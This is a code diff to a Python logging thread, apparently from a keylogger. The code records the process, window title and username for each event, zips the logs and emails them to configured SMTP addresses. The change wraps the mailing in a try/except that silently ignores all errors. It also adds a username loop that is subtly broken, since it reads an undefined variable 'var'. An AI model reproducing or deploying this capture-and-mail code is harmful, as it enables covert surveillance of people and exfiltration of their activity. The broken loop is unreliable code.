@@ -190,11 +190,19 @@ class LogWriter(threading.Thread):
                     self.PrintDebug("some error occurred when opening the log file. we cannot log this event. check systemlog (if specified) for details.\n")
                     continue
                 
+                # try a few different environment vars to get the username
+                for varname in ['USERNAME','USER','LOGNAME']:
+                    username = os.getenv(var)
+                    if username is not None:
+                        break
+                if username is None:
+                    username = 'none'
+                    
                 eventlisttmp = [time.strftime('%Y%m%d'), # date
                                 time.strftime('%H%M'), # time
                                 self.GetProcessName(event).replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), # process name (full path on windows, just name on linux)
                                 str(event.Window), # window handle
-                                unicode(os.getenv('USERNAME'), 'latin-1').replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), # username
+                                unicode(username, 'latin-1').replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), # username
                                 unicode(event.WindowName, 'latin-1').replace(self.settings['General']['Log File Field Separator'], '[sep_key]')] # window title
                                 
                 if self.settings['General']['Log Key Count'] == True:
@@ -416,40 +424,45 @@ class LogWriter(threading.Thread):
                 msg.attach(part)
 
         # set up the server and send the message
-        mysmtp = smtplib.SMTP(self.settings['E-mail']['SMTP Server'], self.settings['E-mail']['SMTP Port'])
-        
-        if self.cmdoptions.debug: 
-            mysmtp.set_debuglevel(1)
-        if self.settings['E-mail']['SMTP Use TLS'] == True:
-            # we find that we need to use two ehlos (one before and one after starttls)
-            # otherwise we get "SMTPException: SMTP AUTH extension not supported by server"
-            # thanks for this solution go to http://forums.belution.com/en/python/000/009/17.shtml
-            mysmtp.ehlo()
-            mysmtp.starttls()
-            mysmtp.ehlo()
-        if self.settings['E-mail']['SMTP Needs Login'] == True:
-            mysmtp.login(self.settings['E-mail']['SMTP Username'], myutils.password_recover(self.settings['E-mail']['SMTP Password']))
-        sendingresults = mysmtp.sendmail(self.settings['E-mail']['SMTP From'], self.settings['E-mail']['SMTP To'].split(";"), msg.as_string())
-        self.PrintDebug("Email sending errors (if any): " + str(sendingresults) + "\n")
-        
-        # need to put the quit in a try, since TLS connections may error out due to bad implementation with
-        # socket.sslerror: (8, 'EOF occurred in violation of protocol')
-        # Most SSL servers and clients (primarily HTTP, but some SMTP as well) are broken in this regard: 
-        # they do not properly negotiate TLS connection shutdown. This error is otherwise harmless.
-        # reference URLs:
-        # http://groups.google.de/group/comp.lang.python/msg/252b421a7d9ff037
-        # http://mail.python.org/pipermail/python-list/2005-August/338280.html
+        # wrap it all in a try/except, so that everything doesn't hang up
+        # in case of network problems and whatnot.
         try:
-            mysmtp.quit()
+            mysmtp = smtplib.SMTP(self.settings['E-mail']['SMTP Server'], self.settings['E-mail']['SMTP Port'])
+            
+            if self.cmdoptions.debug: 
+                mysmtp.set_debuglevel(1)
+            if self.settings['E-mail']['SMTP Use TLS'] == True:
+                # we find that we need to use two ehlos (one before and one after starttls)
+                # otherwise we get "SMTPException: SMTP AUTH extension not supported by server"
+                # thanks for this solution go to http://forums.belution.com/en/python/000/009/17.shtml
+                mysmtp.ehlo()
+                mysmtp.starttls()
+                mysmtp.ehlo()
+            if self.settings['E-mail']['SMTP Needs Login'] == True:
+                mysmtp.login(self.settings['E-mail']['SMTP Username'], myutils.password_recover(self.settings['E-mail']['SMTP Password']))
+            sendingresults = mysmtp.sendmail(self.settings['E-mail']['SMTP From'], self.settings['E-mail']['SMTP To'].split(";"), msg.as_string())
+            self.PrintDebug("Email sending errors (if any): " + str(sendingresults) + "\n")
+            
+            # need to put the quit in a try, since TLS connections may error out due to bad implementation with
+            # socket.sslerror: (8, 'EOF occurred in violation of protocol')
+            # Most SSL servers and clients (primarily HTTP, but some SMTP as well) are broken in this regard: 
+            # they do not properly negotiate TLS connection shutdown. This error is otherwise harmless.
+            # reference URLs:
+            # http://groups.google.de/group/comp.lang.python/msg/252b421a7d9ff037
+            # http://mail.python.org/pipermail/python-list/2005-August/338280.html
+            try:
+                mysmtp.quit()
+            except:
+                pass
+            
+            # write the latest emailed zip to log for the future
+            if len(zipFileList) > 0:
+                zipFileList.sort()
+                emaillog = open(os.path.join(self.settings['General']['Log Directory'], "emaillog.txt"), 'w')
+                emaillog.write(zipFileList.pop())
+                emaillog.close()
         except:
-            pass
-        
-        # write the latest emailed zip to log for the future
-        if len(zipFileList) > 0:
-            zipFileList.sort()
-            emaillog = open(os.path.join(self.settings['General']['Log Directory'], "emaillog.txt"), 'w')
-            emaillog.write(zipFileList.pop())
-            emaillog.close()
+            pass # better luck next time
     
     def OpenLogFile(self):
         '''Open the appropriate log file, depending on event properties and settings in .ini file.
